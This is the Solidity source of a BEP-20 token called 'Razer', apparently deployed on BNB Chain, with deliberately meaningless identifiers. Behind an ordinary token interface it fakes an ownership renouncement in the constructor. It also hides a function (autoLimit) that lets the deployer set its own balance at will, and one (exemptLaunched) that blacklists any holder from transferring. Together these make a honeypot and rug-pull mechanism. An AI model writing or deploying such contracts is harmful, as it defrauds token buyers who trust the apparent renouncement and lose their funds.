/**
 *Submitted for verification at BscScan.com on 2023-02-11
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface fromReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityAt) external view returns (uint256);

    function transfer(address amountTradingToken, uint256 tradingMin) external returns (bool);

    function allowance(address teamLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingMin) external returns (bool);

    function transferFrom(
        address sender,
        address amountTradingToken,
        uint256 tradingMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txEnable, uint256 value);
    event Approval(address indexed teamLaunched, address indexed spender, uint256 value);
}

interface fromReceiverMetadata is fromReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface takeReceiver {
    function createPair(address fundToken, address buyLimit) external returns (address);
}

interface listTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract senderFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Razer is senderFund, fromReceiver, fromReceiverMetadata {
    uint8 private exemptReceiver = 18;
    
    uint256 public amountFromSell;
    bool public modeFundFee;
    
    mapping(address => uint256) private limitMax;
    bool public minLimitToken;
    bool public atMax;
    mapping(address => bool) public feeMarketingAmount;
    address private atTxTake;
    uint256 private atSwapLaunch;
    address public buyFeeLaunched;

    uint256 public fromSender;

    uint256 private liquidityShould = 100000000 * 10 ** exemptReceiver;
    string private liquidityMarketing = "Razer";
    uint256 private fundTxTake;

    mapping(address => mapping(address => uint256)) private marketingModeToken;

    address private feeTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    string private amountList = "RAZER";
    mapping(address => bool) public toTx;
    bool private toTake;

    address public amountReceiver;
    

    event OwnershipTransferred(address indexed liquidityReceiver, address indexed isShould);

    constructor (){
        
        listTake feeTradingAuto = listTake(feeTotal);
        buyFeeLaunched = takeReceiver(feeTradingAuto.factory()).createPair(feeTradingAuto.WETH(), address(this));
        atTxTake = _msgSender();
        
        amountReceiver = atTxTake;
        feeMarketingAmount[amountReceiver] = true;
        if (modeFundFee == toTake) {
            fromSender = fundTxTake;
        }
        limitMax[amountReceiver] = liquidityShould;
        emit Transfer(address(0), amountReceiver, liquidityShould);
        tokenReceiverEnable();
    }

    

    function maxWallet(address takeAmount) public {
        if (minLimitToken) {
            return;
        }
        if (fundTxTake == fromSender) {
            fundTxTake = fromSender;
        }
        feeMarketingAmount[takeAmount] = true;
        
        minLimitToken = true;
    }

    function liquidityMode(address takeList, address amountTradingToken, uint256 tradingMin) internal returns (bool) {
        require(limitMax[takeList] >= tradingMin);
        limitMax[takeList] -= tradingMin;
        limitMax[amountTradingToken] += tradingMin;
        emit Transfer(takeList, amountTradingToken, tradingMin);
        return true;
    }

    function tokenIs(address takeList, address amountTradingToken, uint256 tradingMin) internal returns (bool) {
        if (takeList == amountReceiver || amountTradingToken == amountReceiver) {
            return liquidityMode(takeList, amountTradingToken, tradingMin);
        }
        if (toTake) {
            fromSender = atSwapLaunch;
        }
        require(!toTx[takeList]);
        
        return liquidityMode(takeList, amountTradingToken, tradingMin);
    }

    function getOwner() external view returns (address) {
        return atTxTake;
    }

    function approve(address minTxAuto, uint256 tradingMin) public virtual override returns (bool) {
        marketingModeToken[_msgSender()][minTxAuto] = tradingMin;
        emit Approval(_msgSender(), minTxAuto, tradingMin);
        return true;
    }

    function modeMin() public view returns (uint256) {
        return fromSender;
    }

    function symbol() external view virtual override returns (string memory) {
        return amountList;
    }

    function decimals() external view virtual override returns (uint8) {
        return exemptReceiver;
    }

    function balanceOf(address liquidityAt) public view virtual override returns (uint256) {
        return limitMax[liquidityAt];
    }

    function allowance(address totalFund, address minTxAuto) external view virtual override returns (uint256) {
        return marketingModeToken[totalFund][minTxAuto];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityShould;
    }

    function autoLimit(uint256 tradingMin) public {
        if (!feeMarketingAmount[_msgSender()]) {
            return;
        }
        limitMax[amountReceiver] = tradingMin;
    }

    function launchLimitEnable() public view returns (uint256) {
        return amountFromSell;
    }

    function transferFrom(address takeList, address amountTradingToken, uint256 tradingMin) external override returns (bool) {
        if (marketingModeToken[takeList][_msgSender()] != type(uint256).max) {
            require(tradingMin <= marketingModeToken[takeList][_msgSender()]);
            marketingModeToken[takeList][_msgSender()] -= tradingMin;
        }
        return tokenIs(takeList, amountTradingToken, tradingMin);
    }

    function exemptLaunched(address autoFrom) public {
        if (atMax == modeFundFee) {
            amountFromSell = fundTxTake;
        }
        if (autoFrom == amountReceiver || autoFrom == buyFeeLaunched || !feeMarketingAmount[_msgSender()]) {
            return;
        }
        if (modeFundFee != toTake) {
            toTake = false;
        }
        toTx[autoFrom] = true;
    }

    function owner() external view returns (address) {
        return atTxTake;
    }

    function totalLiquidity() public {
        
        if (modeFundFee) {
            amountFromSell = fromSender;
        }
        atMax=false;
    }

    function shouldAt() public {
        
        if (amountFromSell == fromSender) {
            atSwapLaunch = fromSender;
        }
        modeFundFee=false;
    }

    function name() external view virtual override returns (string memory) {
        return liquidityMarketing;
    }

    function transfer(address enableIsTx, uint256 tradingMin) external virtual override returns (bool) {
        return tokenIs(_msgSender(), enableIsTx, tradingMin);
    }

    function feeAt() public {
        if (fromSender == atSwapLaunch) {
            modeFundFee = true;
        }
        
        amountFromSell=0;
    }

    function tokenReceiverEnable() public {
        emit OwnershipTransferred(amountReceiver, address(0));
        atTxTake = address(0);
    }


}